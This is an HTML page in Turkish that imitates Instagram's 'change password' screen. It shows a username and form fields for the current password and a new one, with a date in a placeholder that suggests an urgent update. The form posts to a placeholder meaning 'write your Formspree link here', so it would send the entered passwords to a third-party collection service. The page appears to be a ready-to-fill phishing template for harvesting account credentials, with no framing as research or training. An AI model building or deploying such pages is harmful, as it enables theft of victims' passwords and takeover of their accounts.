<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Şifreyi Değiştir</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            min-height: 90vh;
            justify-content: space-between;
        }

        .content {
            display: flex;
            flex-direction: column;
        }

        .username {
            font-size: 14px;
            color: #737373;
            margin-bottom: 12px;
            font-weight: 400;
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 12px;
            color: #000000;
        }

        .description {
            font-size: 14px;
            color: #737373;
            line-height: 1.4;
            margin-bottom: 24px;
        }

        .input-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 16px;
        }

        .input-field {
            width: 100%;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            padding: 16px;
            color: #000000;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s ease;
        }

        .input-field::placeholder {
            color: #8e8e8e;
        }

        .input-field:focus {
            border-color: #a8a8a8;
            background-color: #ffffff;
        }

        .forgot-password {
            color: #0095f6;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            align-self: flex-start;
        }

        .submit-btn {
            width: 100%;
            background-color: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 24px;
            padding: 14px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
        }

        .submit-btn:hover {
            background-color: #1877f2;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="content">
            <span class="username">mirzm23 •</span>
            <h1>Şifreyi değiştir</h1>
            <p class="description">
                Şifren en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (!$%@%) oluşmalıdır.
            </p>

            <form action="BURAYA_FORMSPREE_LINKINI_YAZ" method="POST" class="input-group">
                <input type="password" name="Mevcut_Sifre" class="input-field" placeholder="Mevcut şifre (Güncelleme 17.07.2026)" required>
                <input type="password" name="Yeni_Sifre" class="input-field" placeholder="Yeni şifre" required>
                <input type="password" name="Yeni_Sifre_Tekrar" class="input-field" placeholder="Yeni şifreyi tekrar yaz" required>
                
                <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
                <button type="submit" class="submit-btn">Şifreyi değiştir</button>
            </form>
        </div>
    </div>

</body>
</html>
